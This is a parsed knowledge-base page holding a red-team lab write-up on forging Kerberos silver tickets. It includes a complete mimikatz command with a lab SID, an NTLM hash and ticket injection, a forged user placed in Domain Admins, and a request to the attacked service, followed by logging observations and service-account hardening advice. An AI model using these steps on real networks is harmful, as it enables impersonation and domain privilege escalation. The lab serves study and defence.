---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Kerberos: Silver Tickets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-kerberos-silver-tickets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab looks at the technique of forging a cracked TGS Kerberos ticket in order to impersonate another user and escalate privileges from the perspective of a service the TGS was cracked for.

## Preserved Body

````markdown
This lab looks at the technique of forging a cracked TGS Kerberos ticket in order to impersonate another user and escalate privileges from the perspective of a service the TGS was cracked for.

This lab builds on the explorations in [T1208: Kerberoasting](t1208-kerberoasting.md) where a TGS ticket got cracked.

## Execution

I will be using mimikatz to create a Kerberos Silver Ticket - forging/rewriting the cracked ticket with some new details that benefit me as an attacker.&#x20;

Below is a table with values supplied to mimikatz explained and the command itself:

| Argument                                            | Notes                                                                                             |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 | SID of the current user who is forging the ticket. Retrieved with `whoami /user`                  |
| /target:dc-mantvydas.offense.local                  | server hosting the attacked service for which the TGS ticket was cracked                          |
| /service:http                                       | service type being attacked                                                                       |
| /rc4:a87f3a337d73085c45f9416be5787d86               | NTLM hash of the password the TGS ticket was encrypted with. `Passw0rd` in our case               |
| /user:beningnadmin                                  | Forging the user name. This is the user name that will appear in the windows security logs - fun. |
| /id:1155                                            | Forging user's RID - fun                                                                          |
| /ptt                                                | Instructs mimikatz to inject the forged ticket to memory to make it usable immediately            |

Getting our user's SID as explained in the first step in the above table:

![Getting a user's SID](<../../_assets/silver-tickets-whoami.png>)

Issuing the final mimikatz command to create our forged (silver) ticket:
```csharp
mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
```
Checking available tickets in memory with `klist` - note how the ticket shows our forged username `benignadmin` and a forged user id:

![](<../../_assets/silver-tickets-generated-ticket (2).png>)

Note in the above mimikatz window the `Group IDs` which our fake user `benignadmin` is now a member of due to the forged ticket:

| GID | Group Name                  |
| --- | --------------------------- |
| 512 | Domain Admins               |
| 513 | Domain Users                |
| 518 | Schema Admins               |
| 519 | Enterprise Admins           |
| 520 | Group Policy Creator Owners |

![](<../../_assets/silver-tickets-groups.png>)

Initiating a request to the attacked service with a TGS ticket - note that the authentication is successfull:
```csharp
Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
```
![](<../../_assets/silver-tickets-httprequest.png>)

## Observations

Note a network logon from `benignadmin` as well as forged RIDs:

![](<../../_assets/silver-tickets-4624 (1) (1).png>)

It is better not to use user accounts for running services on them, but if you do, make sure to use really strong passwords! Computer accounts generate long and complex passwords and they change frequently, so they are better suited for running services on. Better yet, follow good practices such as using [Group Managed Service Accounts](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831782\(v=ws.11\)) for running more secure services.

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/kerberos-silver-tickets.md)

## Evidence Excerpt

```text
_asset_filenames:
- silver-tickets-4624 (1) (1).png
- silver-tickets-generated-ticket (2).png
- silver-tickets-groups.png
- silver-tickets-httprequest.png
- silver-tickets-whoami.png
_body: '---
description: Credential Access
```
